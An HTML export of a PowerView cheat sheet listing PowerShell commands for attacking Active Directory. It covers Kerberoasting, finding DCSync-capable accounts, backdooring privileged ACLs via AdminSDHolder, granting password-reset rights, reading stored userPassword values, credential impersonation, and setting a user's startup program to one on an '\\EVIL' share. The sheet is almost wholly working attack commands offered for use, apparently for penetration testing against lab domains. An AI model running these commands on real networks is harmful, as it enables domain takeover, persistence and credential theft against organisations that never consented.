<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Powerview Commands</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Powerview Commands</h1><br/><div class="codebox"><div class="codebox">#&nbsp;PowerView&#39;s&nbsp;last&nbsp;major&nbsp;overhaul&nbsp;is&nbsp;detailed&nbsp;here:&nbsp;http://www.harmj0y.net/blog/powershell/make-powerview-great-again/<br />#&nbsp;&nbsp;&nbsp;tricks&nbsp;for&nbsp;the&nbsp;&#39;old&#39;&nbsp;PowerView&nbsp;are&nbsp;at&nbsp;https://gist.github.com/HarmJ0y/3328d954607d71362e3c<br /><br />#&nbsp;the&nbsp;most&nbsp;up-to-date&nbsp;version&nbsp;of&nbsp;PowerView&nbsp;will&nbsp;always&nbsp;be&nbsp;in&nbsp;the&nbsp;dev&nbsp;branch&nbsp;of&nbsp;PowerSploit:<br />#&nbsp;&nbsp;&nbsp;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1<br /><br />#&nbsp;New&nbsp;function&nbsp;naming&nbsp;schema:<br />#&nbsp;&nbsp;&nbsp;Verbs:<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get&nbsp;:&nbsp;retrieve&nbsp;full&nbsp;raw&nbsp;data&nbsp;sets<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Find&nbsp;:&nbsp;‘find’&nbsp;specific&nbsp;data&nbsp;entries&nbsp;in&nbsp;a&nbsp;data&nbsp;set<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Add&nbsp;:&nbsp;add&nbsp;a&nbsp;new&nbsp;object&nbsp;to&nbsp;a&nbsp;destination<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set&nbsp;:&nbsp;modify&nbsp;a&nbsp;given&nbsp;object<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke&nbsp;:&nbsp;lazy&nbsp;catch-all<br />#&nbsp;&nbsp;&nbsp;Nouns:<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Verb-Domain*&nbsp;:&nbsp;indicates&nbsp;that&nbsp;LDAP/.NET&nbsp;querying&nbsp;methods&nbsp;are&nbsp;being&nbsp;executed<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Verb-WMI*&nbsp;:&nbsp;indicates&nbsp;that&nbsp;WMI&nbsp;is&nbsp;being&nbsp;used&nbsp;under&nbsp;the&nbsp;hood&nbsp;to&nbsp;execute&nbsp;enumeration<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Verb-Net*&nbsp;:&nbsp;indicates&nbsp;that&nbsp;Win32&nbsp;API&nbsp;access&nbsp;is&nbsp;being&nbsp;used&nbsp;under&nbsp;the&nbsp;hood<br /><br /><br />#&nbsp;get&nbsp;all&nbsp;the&nbsp;groups&nbsp;a&nbsp;user&nbsp;is&nbsp;effectively&nbsp;a&nbsp;member&nbsp;of,&nbsp;&#39;recursing&nbsp;up&#39;&nbsp;using&nbsp;tokenGroups<br />Get-DomainGroup&nbsp;-MemberIdentity&nbsp;&lt;User/Group&gt;<br /><br />#&nbsp;get&nbsp;all&nbsp;the&nbsp;effective&nbsp;members&nbsp;of&nbsp;a&nbsp;group,&nbsp;&#39;recursing&nbsp;down&#39;<br />Get-DomainGroupMember&nbsp;-Identity&nbsp;&quot;Domain&nbsp;Admins&quot;&nbsp;-Recurse<br /><br />#&nbsp;use&nbsp;an&nbsp;alterate&nbsp;creadential&nbsp;for&nbsp;any&nbsp;function<br />$SecPassword&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;&#39;BurgerBurgerBurger!&#39;&nbsp;-AsPlainText&nbsp;-Force<br />$Cred&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential(&#39;TESTLAB\dfm.a&#39;,&nbsp;$SecPassword)<br />Get-DomainUser&nbsp;-Credential&nbsp;$Cred<br /><br />#&nbsp;retrieve&nbsp;all&nbsp;the&nbsp;computer&nbsp;dns&nbsp;host&nbsp;names&nbsp;a&nbsp;GPP&nbsp;password&nbsp;applies&nbsp;to<br />Get-DomainOU&nbsp;-GPLink&nbsp;&#39;&lt;GPP_GUID&gt;&#39;&nbsp;|&nbsp;%&nbsp;{Get-DomainComputer&nbsp;-SearchBase&nbsp;$_.distinguishedname&nbsp;-Properties&nbsp;dnshostname}<br /><br />#&nbsp;get&nbsp;all&nbsp;users&nbsp;with&nbsp;passwords&nbsp;changed&nbsp;&gt;&nbsp;1&nbsp;year&nbsp;ago,&nbsp;returning&nbsp;sam&nbsp;account&nbsp;names&nbsp;and&nbsp;password&nbsp;last&nbsp;set&nbsp;times<br />$Date&nbsp;=&nbsp;(Get-Date).AddYears(-1).ToFileTime()<br />Get-DomainUser&nbsp;-LDAPFilter&nbsp;&quot;(pwdlastset&lt;=$Date)&quot;&nbsp;-Properties&nbsp;samaccountname,pwdlastset<br /><br />#&nbsp;all&nbsp;enabled&nbsp;users,&nbsp;returning&nbsp;distinguishednames<br />Get-DomainUser&nbsp;-LDAPFilter&nbsp;&quot;(!userAccountControl:1.2.840.113556.1.4.803:=2)&quot;&nbsp;-Properties&nbsp;distinguishedname<br />Get-DomainUser&nbsp;-UACFilter&nbsp;NOT_ACCOUNTDISABLE&nbsp;-Properties&nbsp;distinguishedname<br /><br />#&nbsp;all&nbsp;disabled&nbsp;users<br />Get-DomainUser&nbsp;-LDAPFilter&nbsp;&quot;(userAccountControl:1.2.840.113556.1.4.803:=2)&quot;<br />Get-DomainUser&nbsp;-UACFilter&nbsp;ACCOUNTDISABLE<br /><br />#&nbsp;all&nbsp;users&nbsp;that&nbsp;require&nbsp;smart&nbsp;card&nbsp;authentication<br />Get-DomainUser&nbsp;-LDAPFilter&nbsp;&quot;(useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;<br />Get-DomainUser&nbsp;-UACFilter&nbsp;SMARTCARD_REQUIRED<br /><br />#&nbsp;all&nbsp;users&nbsp;that&nbsp;*don&#39;t*&nbsp;require&nbsp;smart&nbsp;card&nbsp;authentication,&nbsp;only&nbsp;returning&nbsp;sam&nbsp;account&nbsp;names<br />Get-DomainUser&nbsp;-LDAPFilter&nbsp;&quot;(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)&quot;&nbsp;-Properties&nbsp;samaccountname<br />Get-DomainUser&nbsp;-UACFilter&nbsp;NOT_SMARTCARD_REQUIRED&nbsp;-Properties&nbsp;samaccountname<br /><br />#&nbsp;use&nbsp;multiple&nbsp;identity&nbsp;types&nbsp;for&nbsp;any&nbsp;*-Domain*&nbsp;function<br />&#39;S-1-5-21-890171859-3433809279-3366196753-1114&#39;,&nbsp;&#39;CN=dfm,CN=Users,DC=testlab,DC=local&#39;,&#39;4c435dd7-dc58-4b14-9a5e-1fdb0e80d201&#39;,&#39;administrator&#39;&nbsp;|&nbsp;Get-DomainUser&nbsp;-Properties&nbsp;samaccountname,lastlogoff<br /><br />#&nbsp;find&nbsp;all&nbsp;users&nbsp;with&nbsp;an&nbsp;SPN&nbsp;set&nbsp;(likely&nbsp;service&nbsp;accounts)<br />Get-DomainUser&nbsp;-SPN<br /><br />#&nbsp;check&nbsp;for&nbsp;users&nbsp;who&nbsp;don&#39;t&nbsp;have&nbsp;kerberos&nbsp;preauthentication&nbsp;set<br />Get-DomainUser&nbsp;-PreauthNotRequired<br />Get-DomainUser&nbsp;-UACFilter&nbsp;DONT_REQ_PREAUTH<br /><br />#&nbsp;find&nbsp;all&nbsp;service&nbsp;accounts&nbsp;in&nbsp;&quot;Domain&nbsp;Admins&quot;<br />Get-DomainUser&nbsp;-SPN&nbsp;|&nbsp;?{$_.memberof&nbsp;-match&nbsp;&#39;Domain&nbsp;Admins&#39;}<br /><br />#&nbsp;find&nbsp;users&nbsp;with&nbsp;sidHistory&nbsp;set<br />Get-DomainUser&nbsp;-LDAPFilter&nbsp;&#39;(sidHistory=*)&#39;<br /><br />#&nbsp;find&nbsp;any&nbsp;users/computers&nbsp;with&nbsp;constrained&nbsp;delegation&nbsp;st<br />Get-DomainUser&nbsp;-TrustedToAuth<br />Get-DomainComputer&nbsp;-TrustedToAuth<br /><br />#&nbsp;enumerate&nbsp;all&nbsp;servers&nbsp;that&nbsp;allow&nbsp;unconstrained&nbsp;delegation,&nbsp;and&nbsp;all&nbsp;privileged&nbsp;users&nbsp;that&nbsp;aren&#39;t&nbsp;marked&nbsp;as&nbsp;sensitive/not&nbsp;for&nbsp;delegation<br />$Computers&nbsp;=&nbsp;Get-DomainComputer&nbsp;-Unconstrained<br />$Users&nbsp;=&nbsp;Get-DomainUser&nbsp;-AllowDelegation&nbsp;-AdminCount<br /><br />#&nbsp;return&nbsp;the&nbsp;local&nbsp;*groups*&nbsp;of&nbsp;a&nbsp;remote&nbsp;server<br />Get-NetLocalGroup&nbsp;SERVER.domain.local<br /><br />#&nbsp;return&nbsp;the&nbsp;local&nbsp;group&nbsp;*members*&nbsp;of&nbsp;a&nbsp;remote&nbsp;server&nbsp;using&nbsp;Win32&nbsp;API&nbsp;methods&nbsp;(faster&nbsp;but&nbsp;less&nbsp;info)<br />Get-NetLocalGroupMember&nbsp;-Method&nbsp;API&nbsp;-ComputerName&nbsp;SERVER.domain.local<br /><br />#&nbsp;Kerberoast&nbsp;any&nbsp;users&nbsp;in&nbsp;a&nbsp;particular&nbsp;OU&nbsp;with&nbsp;SPNs&nbsp;set<br />Invoke-Kerberoast&nbsp;-SearchBase&nbsp;&quot;LDAP://OU=secret,DC=testlab,DC=local&quot;<br /><br />#&nbsp;Find-DomainUserLocation&nbsp;==&nbsp;old&nbsp;Invoke-UserHunter<br />#&nbsp;enumerate&nbsp;servers&nbsp;that&nbsp;allow&nbsp;unconstrained&nbsp;Kerberos&nbsp;delegation&nbsp;and&nbsp;show&nbsp;all&nbsp;users&nbsp;logged&nbsp;in<br />Find-DomainUserLocation&nbsp;-ComputerUnconstrained&nbsp;-ShowAll<br /><br />#&nbsp;hunt&nbsp;for&nbsp;admin&nbsp;users&nbsp;that&nbsp;allow&nbsp;delegation,&nbsp;logged&nbsp;into&nbsp;servers&nbsp;that&nbsp;allow&nbsp;unconstrained&nbsp;delegation<br />Find-DomainUserLocation&nbsp;-ComputerUnconstrained&nbsp;-UserAdminCount&nbsp;-UserAllowDelegation<br /><br />#&nbsp;find&nbsp;all&nbsp;computers&nbsp;in&nbsp;a&nbsp;given&nbsp;OU<br />Get-DomainComputer&nbsp;-SearchBase&nbsp;&quot;ldap://OU=...&quot;<br /><br />#&nbsp;Get&nbsp;the&nbsp;logged&nbsp;on&nbsp;users&nbsp;for&nbsp;all&nbsp;machines&nbsp;in&nbsp;any&nbsp;*server*&nbsp;OU&nbsp;in&nbsp;a&nbsp;particular&nbsp;domain<br />Get-DomainOU&nbsp;-Identity&nbsp;*server*&nbsp;-Domain&nbsp;&lt;domain&gt;&nbsp;|&nbsp;%{Get-DomainComputer&nbsp;-SearchBase&nbsp;$_.distinguishedname&nbsp;-Properties&nbsp;dnshostname&nbsp;|&nbsp;%{Get-NetLoggedOn&nbsp;-ComputerName&nbsp;$_}}<br /><br />#&nbsp;enumerate&nbsp;all&nbsp;gobal&nbsp;catalogs&nbsp;in&nbsp;the&nbsp;forest<br />Get-ForestGlobalCatalog<br /><br />#&nbsp;turn&nbsp;a&nbsp;list&nbsp;of&nbsp;computer&nbsp;short&nbsp;names&nbsp;to&nbsp;FQDNs,&nbsp;using&nbsp;a&nbsp;global&nbsp;catalog<br />gc&nbsp;computers.txt&nbsp;|&nbsp;%&nbsp;{Get-DomainComputer&nbsp;-SearchBase&nbsp;&quot;GC://GLOBAL.CATALOG&quot;&nbsp;-LDAP&nbsp;&quot;(name=$_)&quot;&nbsp;-Properties&nbsp;dnshostname}<br /><br />#&nbsp;enumerate&nbsp;the&nbsp;current&nbsp;domain&nbsp;controller&nbsp;policy<br />$DCPolicy&nbsp;=&nbsp;Get-DomainPolicy&nbsp;-Policy&nbsp;DC<br />$DCPolicy.PrivilegeRights&nbsp;#&nbsp;user&nbsp;privilege&nbsp;rights&nbsp;on&nbsp;the&nbsp;dc...<br /><br />#&nbsp;enumerate&nbsp;the&nbsp;current&nbsp;domain&nbsp;policy<br />$DomainPolicy&nbsp;=&nbsp;Get-DomainPolicy&nbsp;-Policy&nbsp;Domain<br />$DomainPolicy.KerberosPolicy&nbsp;#&nbsp;useful&nbsp;for&nbsp;golden&nbsp;tickets&nbsp;;)<br />$DomainPolicy.SystemAccess&nbsp;#&nbsp;password&nbsp;age/etc.<br /><br />#&nbsp;enumerate&nbsp;what&nbsp;machines&nbsp;that&nbsp;a&nbsp;particular&nbsp;user/group&nbsp;identity&nbsp;has&nbsp;local&nbsp;admin&nbsp;rights&nbsp;to<br />#&nbsp;&nbsp;&nbsp;Get-DomainGPOUserLocalGroupMapping&nbsp;==&nbsp;old&nbsp;Find-GPOLocation<br />Get-DomainGPOUserLocalGroupMapping&nbsp;-Identity&nbsp;&lt;User/Group&gt;<br /><br />#&nbsp;enumerate&nbsp;what&nbsp;machines&nbsp;that&nbsp;a&nbsp;given&nbsp;user&nbsp;in&nbsp;the&nbsp;specified&nbsp;domain&nbsp;has&nbsp;RDP&nbsp;access&nbsp;rights&nbsp;to<br />Get-DomainGPOUserLocalGroupMapping&nbsp;-Identity&nbsp;&lt;USER&gt;&nbsp;-Domain&nbsp;&lt;DOMAIN&gt;&nbsp;-LocalGroup&nbsp;RDP<br /><br />#&nbsp;export&nbsp;a&nbsp;csv&nbsp;of&nbsp;all&nbsp;GPO&nbsp;mappings<br />Get-DomainGPOUserLocalGroupMapping&nbsp;|&nbsp;%{$_.computers&nbsp;=&nbsp;$_.computers&nbsp;-join&nbsp;&quot;,&nbsp;&quot;;&nbsp;$_}&nbsp;|&nbsp;Export-CSV&nbsp;-NoTypeInformation&nbsp;gpo_map.csv<br /><br />#&nbsp;use&nbsp;alternate&nbsp;credentials&nbsp;for&nbsp;searching&nbsp;for&nbsp;files&nbsp;on&nbsp;the&nbsp;domain<br />#&nbsp;&nbsp;&nbsp;Find-InterestingDomainShareFile&nbsp;==&nbsp;old&nbsp;Invoke-FileFinder<br />$Password&nbsp;=&nbsp;&quot;PASSWORD&quot;&nbsp;|&nbsp;ConvertTo-SecureString&nbsp;-AsPlainText&nbsp;-Force<br />$Credential&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential(&quot;DOMAIN\user&quot;,$Password)<br />Find-InterestingDomainShareFile&nbsp;-Domain&nbsp;DOMAIN&nbsp;-Credential&nbsp;$Credential<br /><br />#&nbsp;enumerate&nbsp;who&nbsp;has&nbsp;rights&nbsp;to&nbsp;the&nbsp;&#39;matt&#39;&nbsp;user&nbsp;in&nbsp;&#39;testlab.local&#39;,&nbsp;resolving&nbsp;rights&nbsp;GUIDs&nbsp;to&nbsp;names<br />Get-DomainObjectAcl&nbsp;-Identity&nbsp;matt&nbsp;-ResolveGUIDs&nbsp;-Domain&nbsp;testlab.local<br /><br />#&nbsp;grant&nbsp;user&nbsp;&#39;will&#39;&nbsp;the&nbsp;rights&nbsp;to&nbsp;change&nbsp;&#39;matt&#39;s&nbsp;password<br />Add-DomainObjectAcl&nbsp;-TargetIdentity&nbsp;matt&nbsp;-PrincipalIdentity&nbsp;will&nbsp;-Rights&nbsp;ResetPassword&nbsp;-Verbose<br /><br />#&nbsp;audit&nbsp;the&nbsp;permissions&nbsp;of&nbsp;AdminSDHolder,&nbsp;resolving&nbsp;GUIDs<br />Get-DomainObjectAcl&nbsp;-SearchBase&nbsp;&#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39;&nbsp;-ResolveGUIDs<br /><br />#&nbsp;backdoor&nbsp;the&nbsp;ACLs&nbsp;of&nbsp;all&nbsp;privileged&nbsp;accounts&nbsp;with&nbsp;the&nbsp;&#39;matt&#39;&nbsp;account&nbsp;through&nbsp;AdminSDHolder&nbsp;abuse<br />Add-DomainObjectAcl&nbsp;-TargetIdentity&nbsp;&#39;CN=AdminSDHolder,CN=System,DC=testlab,DC=local&#39;&nbsp;-PrincipalIdentity&nbsp;matt&nbsp;-Rights&nbsp;All<br /><br />#&nbsp;retrieve&nbsp;*most*&nbsp;users&nbsp;who&nbsp;can&nbsp;perform&nbsp;DC&nbsp;replication&nbsp;for&nbsp;dev.testlab.local&nbsp;(i.e.&nbsp;DCsync)<br />Get-DomainObjectAcl&nbsp;&quot;dc=dev,dc=testlab,dc=local&quot;&nbsp;-ResolveGUIDs&nbsp;|&nbsp;?&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;($_.ObjectType&nbsp;-match&nbsp;&#39;replication-get&#39;)&nbsp;-or&nbsp;($_.ActiveDirectoryRights&nbsp;-match&nbsp;&#39;GenericAll&#39;)<br />}<br /><br />#&nbsp;find&nbsp;linked&nbsp;DA&nbsp;accounts&nbsp;using&nbsp;name&nbsp;correlation<br />Get-DomainGroupMember&nbsp;&#39;Domain&nbsp;Admins&#39;&nbsp;|&nbsp;%{Get-DomainUser&nbsp;$_.membername&nbsp;-LDAPFilter&nbsp;&#39;(displayname=*)&#39;}&nbsp;|&nbsp;%{$a=$_.displayname.split(&#39;&nbsp;&#39;)[0..1]&nbsp;-join&nbsp;&#39;&nbsp;&#39;;&nbsp;Get-DomainUser&nbsp;-LDAPFilter&nbsp;&quot;(displayname=*$a*)&quot;&nbsp;-Properties&nbsp;displayname,samaccountname}<br /><br />#&nbsp;save&nbsp;a&nbsp;PowerView&nbsp;object&nbsp;to&nbsp;disk&nbsp;for&nbsp;later&nbsp;usage<br />Get-DomainUser&nbsp;|&nbsp;Export-Clixml&nbsp;user.xml<br />$Users&nbsp;=&nbsp;Import-Clixml&nbsp;user.xml<br /><br />#&nbsp;Find&nbsp;any&nbsp;machine&nbsp;accounts&nbsp;in&nbsp;privileged&nbsp;groups<br />Get-DomainGroup&nbsp;-AdminCount&nbsp;|&nbsp;Get-DomainGroupMember&nbsp;-Recurse&nbsp;|&nbsp;?{$_.MemberName&nbsp;-like&nbsp;&#39;*$&#39;}<br /><br />#&nbsp;Enumerate&nbsp;permissions&nbsp;for&nbsp;GPOs&nbsp;where&nbsp;users&nbsp;with&nbsp;RIDs&nbsp;of&nbsp;&gt;&nbsp;-1000&nbsp;have&nbsp;some&nbsp;kind&nbsp;of&nbsp;modification/control&nbsp;rights<br />Get-DomainObjectAcl&nbsp;-LDAPFilter&nbsp;&#39;(objectCategory=groupPolicyContainer)&#39;&nbsp;|&nbsp;?&nbsp;{&nbsp;($_.SecurityIdentifier&nbsp;-match&nbsp;&#39;^S-1-5-.*-[1-9]\d{3,}$&#39;)&nbsp;-and&nbsp;($_.ActiveDirectoryRights&nbsp;-match&nbsp;&#39;WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner&#39;)}<br /><br />#&nbsp;find&nbsp;all&nbsp;policies&nbsp;applied&nbsp;to&nbsp;a&nbsp;current&nbsp;machine<br />Get-DomainGPO&nbsp;-ComputerIdentity&nbsp;windows1.testlab.local<br /><br />#&nbsp;enumerate&nbsp;all&nbsp;groups&nbsp;in&nbsp;a&nbsp;domain&nbsp;that&nbsp;don&#39;t&nbsp;have&nbsp;a&nbsp;global&nbsp;scope,&nbsp;returning&nbsp;just&nbsp;group&nbsp;names<br />Get-DomainGroup&nbsp;-GroupScope&nbsp;NotGlobal&nbsp;-Properties&nbsp;name<br /><br />#&nbsp;enumerate&nbsp;all&nbsp;foreign&nbsp;users&nbsp;in&nbsp;the&nbsp;global&nbsp;catalog,&nbsp;and&nbsp;query&nbsp;the&nbsp;specified&nbsp;domain&nbsp;localgroups&nbsp;for&nbsp;their&nbsp;memberships<br />#&nbsp;&nbsp;&nbsp;query&nbsp;the&nbsp;global&nbsp;catalog&nbsp;for&nbsp;foreign&nbsp;security&nbsp;principals&nbsp;with&nbsp;domain-based&nbsp;SIDs,&nbsp;and&nbsp;extract&nbsp;out&nbsp;all&nbsp;distinguishednames<br />$ForeignUsers&nbsp;=&nbsp;Get-DomainObject&nbsp;-Properties&nbsp;objectsid,distinguishedname&nbsp;-SearchBase&nbsp;&quot;GC://testlab.local&quot;&nbsp;-LDAPFilter&nbsp;&#39;(objectclass=foreignSecurityPrincipal)&#39;&nbsp;|&nbsp;?&nbsp;{$_.objectsid&nbsp;-match&nbsp;&#39;^S-1-5-.*-[1-9]\d{2,}$&#39;}&nbsp;|&nbsp;Select-Object&nbsp;-ExpandProperty&nbsp;distinguishedname<br />$Domains&nbsp;=&nbsp;@{}<br />$ForeignMemberships&nbsp;=&nbsp;ForEach($ForeignUser&nbsp;in&nbsp;$ForeignUsers)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;extract&nbsp;the&nbsp;domain&nbsp;the&nbsp;foreign&nbsp;user&nbsp;was&nbsp;added&nbsp;to<br />&nbsp;&nbsp;&nbsp;&nbsp;$ForeignUserDomain&nbsp;=&nbsp;$ForeignUser.SubString($ForeignUser.IndexOf(&#39;DC=&#39;))&nbsp;-replace&nbsp;&#39;DC=&#39;,&#39;&#39;&nbsp;-replace&nbsp;&#39;,&#39;,&#39;.&#39;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;check&nbsp;if&nbsp;we&#39;ve&nbsp;already&nbsp;enumerated&nbsp;this&nbsp;domain<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(-not&nbsp;$Domains[$ForeignUserDomain])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Domains[$ForeignUserDomain]&nbsp;=&nbsp;$True<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;enumerate&nbsp;all&nbsp;domain&nbsp;local&nbsp;groups&nbsp;from&nbsp;the&nbsp;given&nbsp;domain&nbsp;that&nbsp;have&nbsp;membership&nbsp;set&nbsp;with&nbsp;our&nbsp;foreignSecurityPrincipal&nbsp;set<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$Filter&nbsp;=&nbsp;&quot;(|(member=&quot;&nbsp;+&nbsp;$($ForeignUsers&nbsp;-join&nbsp;&quot;)(member=&quot;)&nbsp;+&nbsp;&quot;))&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-DomainGroup&nbsp;-Domain&nbsp;$ForeignUserDomain&nbsp;-Scope&nbsp;DomainLocal&nbsp;-LDAPFilter&nbsp;$Filter&nbsp;-Properties&nbsp;distinguishedname,member<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br />$ForeignMemberships&nbsp;|&nbsp;fl<br /><br />#&nbsp;if&nbsp;running&nbsp;in&nbsp;-sta&nbsp;mode,&nbsp;impersonate&nbsp;another&nbsp;credential&nbsp;a&nbsp;la&nbsp;&quot;runas&nbsp;/netonly&quot;<br />$SecPassword&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;&#39;Password123!&#39;&nbsp;-AsPlainText&nbsp;-Force<br />$Cred&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential(&#39;TESTLAB\dfm.a&#39;,&nbsp;$SecPassword)<br />Invoke-UserImpersonation&nbsp;-Credential&nbsp;$Cred<br />#&nbsp;...&nbsp;action<br />Invoke-RevertToSelf<br /><br />#&nbsp;enumerates&nbsp;computers&nbsp;in&nbsp;the&nbsp;current&nbsp;domain&nbsp;with&nbsp;&#39;outlier&#39;&nbsp;properties,&nbsp;i.e.&nbsp;properties&nbsp;not&nbsp;set&nbsp;from&nbsp;the&nbsp;firest&nbsp;result&nbsp;returned&nbsp;by&nbsp;Get-DomainComputer<br />Get-DomainComputer&nbsp;-FindOne&nbsp;|&nbsp;Find-DomainObjectPropertyOutlier<br /><br />#&nbsp;set&nbsp;the&nbsp;specified&nbsp;property&nbsp;for&nbsp;the&nbsp;given&nbsp;user&nbsp;identity<br />Set-DomainObject&nbsp;testuser&nbsp;-Set&nbsp;@{&#39;mstsinitialprogram&#39;=&#39;\\EVIL\program.exe&#39;}&nbsp;-Verbose<br /><br />#&nbsp;Set&nbsp;the&nbsp;owner&nbsp;of&nbsp;&#39;dfm&#39;&nbsp;in&nbsp;the&nbsp;current&nbsp;domain&nbsp;to&nbsp;&#39;harmj0y&#39;<br />Set-DomainObjectOwner&nbsp;-Identity&nbsp;dfm&nbsp;-OwnerIdentity&nbsp;harmj0y<br /><br />#&nbsp;retrieve&nbsp;*most*&nbsp;users&nbsp;who&nbsp;can&nbsp;perform&nbsp;DC&nbsp;replication&nbsp;for&nbsp;dev.testlab.local&nbsp;(i.e.&nbsp;DCsync)<br />Get-ObjectACL&nbsp;&quot;DC=testlab,DC=local&quot;&nbsp;-ResolveGUIDs&nbsp;|&nbsp;?&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;($_.ActiveDirectoryRights&nbsp;-match&nbsp;&#39;GenericAll&#39;)&nbsp;-or&nbsp;($_.ObjectAceType&nbsp;-match&nbsp;&#39;Replication-Get&#39;)<br />}<br /><br />#&nbsp;check&nbsp;if&nbsp;any&nbsp;user&nbsp;passwords&nbsp;are&nbsp;set<br />$FormatEnumerationLimit=-1;Get-DomainUser&nbsp;-LDAPFilter&nbsp;&#39;(userPassword=*)&#39;&nbsp;-Properties&nbsp;samaccountname,memberof,userPassword&nbsp;|&nbsp;%&nbsp;{Add-Member&nbsp;-InputObject&nbsp;$_&nbsp;NoteProperty&nbsp;&#39;Password&#39;&nbsp;&quot;$([System.Text.Encoding]::ASCII.GetString($_.userPassword))&quot;&nbsp;-PassThru}&nbsp;|&nbsp;fl<br /></div></div></div></body></html>